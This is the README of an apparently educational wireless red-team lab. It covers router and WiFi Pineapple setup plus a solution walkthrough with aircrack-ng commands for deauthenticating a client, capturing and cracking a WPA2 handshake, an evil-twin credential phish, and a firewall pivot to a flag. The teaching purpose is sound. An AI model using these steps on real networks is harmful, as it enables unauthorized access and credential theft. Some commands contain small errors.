
<a id="readme-top"></a>
<!--
*** markdown "reference style" links are used for readability.
*** Reference links are enclosed in brackets [ ] instead of parentheses ( ).
*** See the bottom of this document for the declaration of the reference variables
*** for contributors-url, forks-url, etc. This is an optional, concise syntax you may use.
*** https://www.markdownguide.org/basic-syntax/#reference-style-links
-->
[![Contributors][contributors-shield]][contributors-url]
[![Forks][forks-shield]][forks-url]
[![Stargazers][stars-shield]][stars-url]
[![Issues][issues-shield]][issues-url]
[![project_license][license-shield]][license-url]
[![LinkedIn][linkedin-shield]][linkedin-url]



<!-- PROJECT LOGO -->
<div align="center">
  <a href="https://github.com/Server2090/Wireless_Escalation_Lab">
    <img src="images/wireless_logo.png" alt="Logo" width="500" height="150">
  </a>

<h3 align="center">Wireless Escalation Lab</h3>

  <p align="center">
    The Wireless Escalation Lab is a hands on offensive security exercise where simulate a red team assessment against a small enterprise Wi-Fi environment using only laptops, two consumer routers, and a Wi-Fi Pineapple. Students first compromise a vulnerable WPA2 Guest Wi-Fi network by capturing and cracking a WPA2 handshake with a password found in a wordlist. Then students deploy an evil twin access point to phish router administration credentials from a scripted employee laptop accessing the router admin webpage over the Guest network. Using these stolen credentials from the Guest network, they must log into the router, misconfigure the port forward rules to pivot into an internal Corp network hosting a simple intranet web service that exposes a flag. This lab is designed for high school or introductory college cybersecurity students and emphasizes realistic wireless attack chaining including recon, WPA2 cracking, evil twin, credential harvesting, network sniffing, segmentation bypass, all in a controlled single room environment. 
    <br />
    <a href="https://github.com/Server2090/Wireless_Escalation_Lab"><strong>Explore the docs »</strong></a>
    <br />
    <br />
    <a href="https://github.com/Server2090/Wireless_Escalation_Lab">View Demo</a>
    &middot;
    <a href="https://github.com/Server2090/Wireless_Escalation_Lab/issues/new?labels=bug&template=bug-report---.md">Report Bug</a>
    &middot;
    <a href="https://github.com/Server2090/Wireless_Escalation_Lab/issues/new?labels=enhancement&template=feature-request---.md">Request Feature</a>
  </p>
</div>



<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li>
      <a href="#about-the-project">About The Project</a>
    </li>
    <li>
      <a href="#getting-started">Getting Started</a>
      <ul>
        <li><a href="#prerequisites">Prerequisites</a></li>
        <li><a href="#installation">Installation</a></li>
	        <ul>
			    <li><a href="#Guest Router (ECC-GUEST) Initial Configuration (Simulated Employee Laptop) ">Guest Router (ECC-GUEST) Initial Configuration (Simulated Employee Laptop</a></li>
			    <li><a href="#Corp Router (ECC-CORP) Initial Configuration (Simulated Employee Laptop)">Corp Router (ECC-CORP) Initial Configuration (Simulated Employee Laptop)</a></li>
			    <li><a href="#WiFi Pineapple Setup (Attacker Laptop)">WiFi Pineapple Setup (Attacker Laptop)</a></li>
			    <li><a href="#Simulated Employee Laptop">Simulated Employee Laptop</a></li>
			    <li><a href="#Corp Intranet Server Setup (Intranet Device)">Corp Intranet Server Setup (Intranet Device)</a></li>
		    </ul>
		<li><a href="#solution">Solution</a></li>
			<ul>
				<li><a href="#Stage 1 Crack ECC-GUEST PSK">Stage 1 Crack ECC-GUEST PSK</a></li>
				<li><a href="#Stage 2: Evil Twin + DNS Spoof">Stage 2: Evil Twin + DNS Spoof</a></li>
				<li><a href="#Stage 3 Guest → Corp Escalation">Stage 3 Guest → Corp Escalation</a></li>
			</ul>
      </ul>
    </li>
    <li><a href="#usage">Usage</a></li>
    <li><a href="#roadmap">Roadmap</a></li>
    <li><a href="#contributing">Contributing</a></li>
    <li><a href="#Top Contributors">Top Contributors</a></li>
    <li><a href="#license">License</a></li>
    <li><a href="#contact">Contact</a></li>
  </ol>
</details>



<!-- ABOUT THE PROJECT -->
## About The Project

The Wireless Escalation Lab is a hands on offensive security exercise where simulate a red team assessment against a small enterprise Wi-Fi environment using only laptops, two consumer routers, and a Wi-Fi Pineapple. Students first compromise a vulnerable WPA2 Guest Wi-Fi network by capturing and cracking a WPA2 handshake with a password found in a wordlist. Then students deploy an evil twin access point to phish router administration credentials from a scripted employee laptop accessing the router admin webpage over the Guest network. Students may also pivot to capture credentials via network sniffing as well. Using these stolen credentials from the Guest network, they must log into the router, misconfigure the firewall rules to pivot into an internal Corp network hosting a simple intranet web service that exposes a flag. This lab is designed for high school or introductory college cybersecurity students and emphasizes realistic wireless attack chaining including recon, WPA2 cracking, evil twin, credential harvesting, network sniffing, segmentation bypass, all in a controlled single room environment. 

<p align="right">[<a href="#readme-top">Back to Top</a>]</p>

## Getting Started

### Prerequisites

**Networking Hardware**
* 2 Linksys WRT54G Routers with stock firmware
* 1 Wi-Fi Pineapple
**Endpoints and Hosts**
* 1× instructor/victim laptop running Ubuntu or Kali Linux (used for automation scripts and simulated user activity)
- 1× device to host the “Corp intranet” service (this can be the same Linux laptop, a Raspberry Pi, or another PC capable of running a simple HTTP server)
- 1× or more student laptops with Wi‑Fi and a modern web browser
**Software requirements (on the Linux host)**
- NetworkManager (`nmcli`) for managing Wi‑Fi connections
- A web browser (Firefox or Firefox ESR)
- `xdotool` for scripted keyboard input into the browser
- Python 3 (for running a basic HTTP server to host the backend/intranet page)

<p align="right">[<a href="#readme-top">Back to Top</a>]</p>

### Installation
1. Complete the [[#Guest Router (ECC-GUEST) Initial Configuration (Simulated Employee Laptop)]] section
2. Complete the [[#Corp Router (ECC-CORP) Initial Configuration (Simulated Employee Laptop)]] section
3. Complete the [[#WiFi Pineapple Setup (Attacker Laptop)]]
4. Complete the [[#Simulated Employee Laptop]] section
5. Complete the [[#Corp Intranet Server Setup (Intranet Device)]] section

<p align="right">[<a href="#readme-top">Back to Top</a>]</p>

#### Guest Router (ECC-GUEST) Initial Configuration (Simulated Employee Laptop)
1. **Factory reset the router**
	- Hold the physical reset button for 30 seconds until the default linksys wireless network appears
	- Temporarily set the laptop to a static IP in the same subnet (for example `192.168.1.5/24`)
2. **Access the default web interface**
	- Connect via Ethernet
	- In a browser, navigate to `http://192.168.1.1`
	- Login with:
		- Username: (leave blank)
		- Password: `admin`
3. **Basic Setup (Setup → Basic Setup)**
	- Internet (WAN) connection type: **Automatic Configuration – DHCP**
	- Gateway and DNS: **leave at defaults** (autoconfig via DHCP)
	- Router Name: `ECC-GUEST`
	- Host Name: `ECC-GUEST`
	- Domain Name: `ECC`
	- Local IP Address: `192.168.1.1`
	- Subnet Mask: `255.255.255.0`
	- DHCP Server: **Enabled**
	- Starting IP Address: `192.168.1.100`
	- Maximum Number of DHCP Users: `100`
	- Time Zone: set to Eastern Time
4. **Wireless Configuration (Wireless → Basic Wireless Settings)**
	- Wireless Network Name (SSID): `ECC-GUEST`
	- Wireless Mode/Channel: **leave at defaults or set as desired for your lab**
5. **Wireless Security (Wireless → Wireless Security)**
	- Security Mode: **WPA2 Personal**
	- Encryption: **AES**
	- WPA Shared Key: `corpwirelessnetwork`
6. **Access Restrictions (Access Restrictions → Internet Access)**
	- Status: **Enable**
	- Enter Policy Name: **Blocking Internet All Time**
	- PCs: 
		- Edit List of PCs: 
			- IP Range 01: `192.168.1.0 ~ 192.168.1.254`
		- Internet access during selected days and hours: **Allow**
	- Blocked Services: **HTTP**
7. **Administration hardening (Administration → Management)**
	- Router Password: `AdminSecure123!`
	- Confirm Password: `AdminSecure123!`
	- Save and apply settings.
8. **Logging (Administration → Log)**
	- Log: **Enable**
	- Apply settings.
9. **Optional: Backup configuration (Administration → Config Management)**
	- Use the Backup option to download the current configuration so it can be restored quickly if you need to re‑deploy this lab router

<p align="right">[<a href="#readme-top">Back to Top</a>]</p>

#### Corp Router (ECC-CORP) Initial Configuration (Simulated Employee Laptop)
1. **Factory reset the router**
	- Hold the physical reset button for 30 seconds until the default linksys wireless network appears
	- Temporarily set the laptop to a static IP in the same subnet (for example `192.168.1.5/24`)
2. **Access the default web interface**
	- Connect via Ethernet
	- In a browser, navigate to `http://192.168.1.1/24`
	- Login with:
		- Username: (leave blank)
		- Password: `admin`
3. **Basic Setup (Setup → Basic Setup)**
	- Internet (WAN) connection type: **Automatic Configuration – DHCP**
	- Gateway and DNS: **leave at defaults** (autoconfig via DHCP)
	- Router Name: `ECC-CORP`
	- Host Name: `ECC-CORP`
	- Domain Name: `ECC`
	- Local IP Address: `192.168.2.1`
	- Subnet Mask: `255.255.255.0`
	- DHCP Server: **Enabled**
	- Starting IP Address: `192.168.2.100`
	- Maximum Number of DHCP Users: `100`
	- Time Zone: set to Eastern Time
4. **Wireless Configuration (Wireless → Basic Wireless Settings)**
	- Wireless Network Name (SSID): `ECC-CORP`
	- Wireless Mode/Channel: **leave at defaults or set as desired for your lab**
5. **Wireless Security (Wireless → Wireless Security)**
	- Security Mode: **WPA2 Personal**
	- Encryption: **AES**
	- WPA Shared Key: `NotEverCrackableInThisTimeFrame67!`
6. **Administration hardening (Administration → Management)**
	- Router Password: `ThisTime1`
	- Confirm Password: `ThisTime1`
	- Save and apply settings
7. **Logging (Administration → Log)**
	- Log: **Enable**
	- Apply settings.
8. **Optional: Backup configuration (Administration → Config Management)**
	- Use the Backup option to download the current configuration so it can be restored quickly if you need to re‑deploy this lab router

<p align="right">[<a href="#readme-top">Back to Top</a>]</p>

#### WiFi Pineapple Setup (Attacker Laptop)
 1. **Connect the Pineapple to the laptop**
	- Use wired USB-C connection to connect the WiFi Pineapple to the laptop
2. **Connect to WiFi Pineapple**
	-  Temporarily set the laptop to a static IP in the same subnet (for example `192.168.1.5/24`)
	- Navigate to `http://172.16.42.1:1471`
	- Pineapple Username: `root`
	- Pineapple Password: `hak5pineapple`
3. **Setup new WiFi Pineapple Password

<p align="right">[<a href="#readme-top">Back to Top</a>]</p>

#### Simulated Employee Laptop
1. Clone the repo
```sh
git clone https://github.com/Server2090/Wireless_Escalation_Lab.git
cd Wireless_Escalation_Lab
cd scripts_and_services/
```
2. Configure the Scripts 
```sh
vi router_autologin.service

#change the $username$ variable to the username of the local account on the machine
```
3. Install Required Services
```sh
sudo mv router_autologin.service /etc/systemd/system
sudo mv wifi_keepalive.service /etc/systemd/system
```
4. Install Required Scripts
```sh
sudo mkdir /usr/local/lib/router_autologin/
sudo mkdir /usr/local/lib/wifi_keepalive/
sudo mv auto_connect.sh /usr/local/lib/wifi_keepalive/
sudo mv router_autologin.sh /usr/local/lib/router_autologin/
```
5. Create Persistent Profile for WiFi Auto Reconnect
```sh
sudo chmod +x create_persistent_connection_profile.sh
./create_persistent_connection_profile.sh
```
3. Enable and start services
```sh
sudo systemctl enable wifi_keepalive.service
sudo systemctl enable router_autologin.service
sudo systemctl start wifi_keepalive.service
sudo systemctl start router_autologin.service
```
3. Allow the services to auto execute and connect to the two routers

<p align="right">[<a href="#readme-top">Back to Top</a>]</p>

#### Corp Intranet Server Setup (Intranet Device)
1. Install Python3
```sh
sudo apt update
sudo apt install -y python3
```
2.  Setup HTML File 
```sh
mv index.html /var/www/html
```
3. Start Python3 Server
```sh
cd /var/www/html
sudo python3 -m http.server 80 bind 0.0.0.0
```

<p align="right">[<a href="#readme-top">Back to Top</a>]</p>

### Solution
1. [[#Stage 1 Crack ECC-GUEST PSK]]
2. [[#Stage 2: Evil Twin + DNS Spoof]]
3. [[#Stage 3 Guest → Corp Escalation]]

<p align="right">[<a href="#readme-top">Back to Top</a>]</p>

#### Stage 1: Crack ECC-GUEST PSK

1. Start airodump-ng
```sh
sudo airmon-ng check kill
# kill any process ids that appear using sudo pkill ${PROCESS_ID}
sudo airmon-ng start ${INTERFACE}
sudo airodump-ng "${INTERFACE}mon" 
#note the ECC-GUEST BSSID/ROUTER_MAC
```
2. Use airodump-ng to View Connected Devices
```sh
sudo airmon-ng -c ${CHANNEL} --bssid ${ROUTER_MAC} "${INTERFACE}mon" 
#note the STATION_MAC and do deauth attack based on STATION_MAC
#kill airmon-ng with CTRL+C to copy MAC and then restart it with the command below
sudo airmon-ng -c ${CHANNEL} --bssid ${ROUTER_MAC} -w output "${INTERFACE}mon" 
```
3. Initialize Wireshark
```sh
sudo Wireshark
#select the "$INTERFACE}mon" and start capturing packets
```
4. Deauth the STATION_MAC
```sh
sudo aireplay-ng --deauth 10 -a ${ROUTER_MAC} -c ${STATION_MAC} "${INTERFACE}mon" 
```
5. Stop Data Capture
```sh
#use CTRL+C to stop airmon-ng data capture
#stop wireshark packet capture
#authentication packets can be viewed by searching for 'eapol' in Wireshark
```
6. Crack the Password
```sh
sudo aircrack-ng -w ${WORDLIST} ${CAPTURE_FILE}
```

<p align="right">[<a href="#readme-top">Back to Top</a>]</p>
#### Stage 2: Evil Twin + DNS Spoof
1. Shutdown Promiscuous Mode
```sh
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```
2. Connect to ECC-GUEST
3. Setup WiFi Pineapple
	1. Connect to the Internet
	2. Install tcpdump Package
	3. Connect to ECC-GUEST instead of Internet
4. WiFi Pineapple
	1. Clone the ECC-GUEST AP
	2. Enable the Evil Twin
	3. Keep Pineapple closer to the host device than the other router to have more signal strength
	4. Run tcpdump
	5. Deauthenticate All Users
	6. Download tcpdump packets 
5. Analyze tcpdump packets for HTTP GET Request with Credentials
6. Find Credentials

<p align="right">[<a href="#readme-top">Back to Top</a>]</p>

#### Stage 3: Guest → Corp Escalation
1. Using Credentials Gathered, Login to ECC-GUEST Router
2. Modify Firewall Rule to Allow Access to ECC-CORP network
3. Ping ECC-CORP Network Resources
```sh
ping 192.168.2.1
```
4. Grab Flag
```sh
curl http://192.168.2.1:80/index.html
```

<p align="right">[<a href="#readme-top">Back to Top</a>]</p>

<!-- USAGE EXAMPLES -->
## Usage

##### Attack Flow (3 Stages, Both Cracking + Evil Twin Required)

**Stage 1: Crack ECC-GUEST PSK**
Deauth victim → capture handshake → crack PSK → Flag 1 (crack screenshot).

**Stage 2: Evil Twin + DNS Spoof**
Hak5 evil twin (same SSID/PSK, stronger signal) → deauth victim → auto-joins → DNS spoof 192.168.1.1 → victim types username/password → Flag 2 (captured creds).

**Stage 3: Guest → Corp Escalation**
Join real ECC-GUEST (cracked PSK) → login real router (phished creds) → modify firewall → reach corp resources → Flag 3.

<p align="right">[<a href="#readme-top">Back to Top</a>]</p>
<!-- ROADMAP -->
## Roadmap

- [ ] Short Term
	- [ ] Refine setup documentation with screenshots and troubleshooting tips
	- [ ] Add step by step student handouts and instructor runbook
	- [ ] Provide example captures (PCAPs) and sample flags for offline practice
- [ ] Medium Term
	- [ ] Add an alternative lab profile using newer hardware with WPA3 support
	- [ ] Include optional blue team extensions (log analysis, incident report, write ups)
	- [ ] Publish ready made VM images or configuration scripts for the victim and intranet hosts
- [ ] Long Term
    - [ ] Develop additional wireless scenarios 
    - [ ] Add automated grading and scoring scripts for flags and lab completion
    - [ ] Create slide decks and assessment materials for instructors adopting the lab

See the [open issues](https://github.com/Server2090/Wireless_Escalation_Lab/issues) for a full list of proposed features (and known issues).

<p align="right">[<a href="#readme-top">Back to Top</a>]</p>

<!-- CONTRIBUTING -->
## Contributing

Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.

If you have a suggestion that would make this better, please fork the repo and create a pull request. You can also simply open an issue with the tag "enhancement".

1. Fork the Project
2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the Branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

<p align="right">[<a href="#readme-top">Back to Top</a>]</p>

### Top contributors:

<a href="https://github.com/Server2090/Wireless_Escalation_Lab/graphs/contributors">
  <img src="https://contrib.rocks/image?repo=Server2090/Wireless_Escalation_Lab" alt="contrib.rocks image" />
</a>

<p align="right">[<a href="#readme-top">Back to Top</a>]</p>

<!-- LICENSE -->
## License

Distributed under the MIT License. See `LICENSE.txt` for more information.

<p align="right">[<a href="#readme-top">Back to Top</a>]</p>

<!-- CONTACT -->
## Contact

Mintas Ivaska - [LinkedIn](https://linkedin.com/in/mintas-ivaska) - ivaska.mintas@gmail.com

Project Link: [https://github.com/Server2090/Wireless_Escalation_Lab](https://github.com/ServeWireless_Escalation_Lab)

<p align="right">[<a href="#readme-top">Back to Top</a>]</p>


<!-- MARKDOWN LINKS & IMAGES -->
<!-- https://www.markdownguide.org/basic-syntax/#reference-style-links -->
[contributors-shield]: https://img.shields.io/github/contributors/Server2090/Wireless_Escalation_Lab.svg?style=for-the-badge
[contributors-url]: https://github.com/Server2090/Wireless_Escalation_Lab/graphs/contributors
[forks-shield]: https://img.shields.io/github/forks/Server2090/Wireless_Escalation_Lab.svg?style=for-the-badge
[forks-url]: https://github.com/Server2090/Wireless_Escalation_Lab/network/members
[stars-shield]: https://img.shields.io/github/stars/Server2090/Wireless_Escalation_Lab.svg?style=for-the-badge
[stars-url]: https://github.com/Server2090/Wireless_Escalation_Lab/stargazers
[issues-shield]: https://img.shields.io/github/issues/Server2090/Wireless_Escalation_Lab.svg?style=for-the-badge
[issues-url]: https://github.com/Server2090/Wireless_Escalation_Lab/issues
[license-shield]: https://img.shields.io/github/license/Server2090/Wireless_Escalation_Lab.svg?style=for-the-badge
[license-url]: https://github.com/Server2090/Wireless_Escalation_Lab/blob/master/LICENSE.txt
[linkedin-shield]: https://img.shields.io/badge/-LinkedIn-black.svg?style=for-the-badge&logo=linkedin&colorB=555
[linkedin-url]: https://linkedin.com/in/mintas-ivaska